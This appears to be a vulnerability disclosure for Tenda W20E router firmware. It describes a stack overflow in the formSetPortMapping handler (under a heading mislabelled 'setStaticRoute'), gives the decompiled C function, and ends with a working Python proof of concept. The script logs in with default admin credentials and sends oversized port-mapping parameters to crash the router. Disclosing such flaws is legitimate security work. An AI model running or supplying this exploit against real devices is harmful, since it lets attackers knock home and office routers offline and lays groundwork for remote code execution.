# Tenda W20E

### version

```
V15.11.0.6 （US_W20EV4.0br_V15.11.0.6（1068_1546_841）_CN_TDC）
```

### Firmware

```
https://www.tenda.com.cn/download/detail-2707.html
```



## setStaticRoute

### detail

In function formSetPortMapping,the content obtained by the program from the parameter "portMappingServer","portMappingProtocol","portMappingWan","porMappingtInternal","portMappingExternal" are passed to pLanIP,pProtocl,pWanid,pLanPortRange and pWanPortRange.Then the pLanIP,pProtocl,pWanid,pLanPortRange and pWanPortRange are directly copied into the sMibValue stack through the sprintf function.There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.

```c
void __cdecl formSetPortMapping(webs_t wp, char_t *path, char_t *query)
{
  int v3; // r3
  int v4; // r0
  unsigned __int8 sNetctlParm[32]; // [sp+20h] [bp-164h] BYREF
  unsigned __int8 sMibName[32]; // [sp+40h] [bp-144h] BYREF
  unsigned __int8 sMibValue[256]; // [sp+60h] [bp-124h] BYREF
  char_t *pWanPortRange; // [sp+160h] [bp-24h]
  char_t *pLanPortRange; // [sp+164h] [bp-20h]
  char_t *pWanid; // [sp+168h] [bp-1Ch]
  char_t *pProtocl; // [sp+16Ch] [bp-18h]
  char_t *pLanIP; // [sp+170h] [bp-14h]
  char_t *pPortMapIndex; // [sp+174h] [bp-10h]
  int iListNum; // [sp+178h] [bp-Ch]
  int iPortMapIndex; // [sp+17Ch] [bp-8h]

  memset(sMibValue, 0, sizeof(sMibValue));
  *(_DWORD *)sMibName = 0;
  *(_DWORD *)&sMibName[4] = 0;
  *(_DWORD *)&sMibName[8] = 0;
  *(_DWORD *)&sMibName[12] = 0;
  *(_DWORD *)&sMibName[16] = 0;
  *(_DWORD *)&sMibName[20] = 0;
  *(_DWORD *)&sMibName[24] = 0;
  *(_DWORD *)&sMibName[28] = 0;
  *(_DWORD *)sNetctlParm = 0;
  *(_DWORD *)&sNetctlParm[4] = 0;
  *(_DWORD *)&sNetctlParm[8] = 0;
  *(_DWORD *)&sNetctlParm[12] = 0;
  *(_DWORD *)&sNetctlParm[16] = 0;
  *(_DWORD *)&sNetctlParm[20] = 0;
  *(_DWORD *)&sNetctlParm[24] = 0;
  *(_DWORD *)&sNetctlParm[28] = 0;
  iPortMapIndex = 0;
  iListNum = 0;
  pPortMapIndex = websGetVar(wp, "portMappingIndex", byte_E45DC);
  iPortMapIndex = atoi((const char *)pPortMapIndex);
  if ( iPortMapIndex + 1 <= 20 )
  {
    pLanIP = websGetVar(wp, "portMappingServer", byte_E45DC);
    pProtocl = websGetVar(wp, "portMappingProtocol", byte_E45DC);
    pWanid = websGetVar(wp, "portMappingWan", byte_E45DC);
    pLanPortRange = websGetVar(wp, "porMappingtInternal", byte_E45DC);
    pWanPortRange = websGetVar(wp, "portMappingExternal", byte_E45DC);
    sprintf(
      (char *)sMibValue,
      "%s;%s;%s;%s;%s;%d",
      (const char *)pWanid,
      (const char *)pWanPortRange,
      (const char *)pLanPortRange,
      (const char *)pLanIP,
      (const char *)pProtocl,
      1);
    sprintf((char *)sMibName, "adv.virtualser.list%d", iPortMapIndex + 1);
    SetValue(sMibName, sMibValue);
    GetValue((int)"adv.virtualser.listnum", (int)sMibValue);
    iListNum = atoi((const char *)sMibValue);
    log_debug_print("formSetPortMapping", 82, 2, 65, "index = %d, listnum = %d", iPortMapIndex, iListNum);
    v3 = iPortMapIndex + 1;
    if ( iListNum >= iPortMapIndex + 1 )
      v3 = iListNum;
    iListNum = v3;
    memset(sMibValue, 0, sizeof(sMibValue));
    sprintf((char *)sMibValue, "%d", iListNum);
    v4 = SetValue("adv.virtualser.listnum", sMibValue);
    if ( CommitCfm(v4) )
    {
      sprintf((char *)sNetctlParm, "advance_type=%d", 2);
      send_msg_to_netctrl(5, sNetctlParm);
    }
    outputToWebs(wp, "1");
  }
  else
  {
    puts("Port map list out of range");
  }
  outputToWebs(wp, "-1");
}
```



### poc

```python
import requests

cmd  = b'portMappingIndex=' + b'9' 
cmd += b'&portMappingServer=' + b'A' * 500
cmd += b'&portMappingProtocol=' + b'A' * 500
cmd += b'&portMappingWan=' + b'A' * 500
cmd += b'&porMappingtInternal=' + b'A' * 500
cmd += b'&portMappingExternal=' + b'A' * 500

url = b"http://192.168.0.1/login/Auth"
payload = b"http://192.168.0.1/goform/setPortMapping/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```
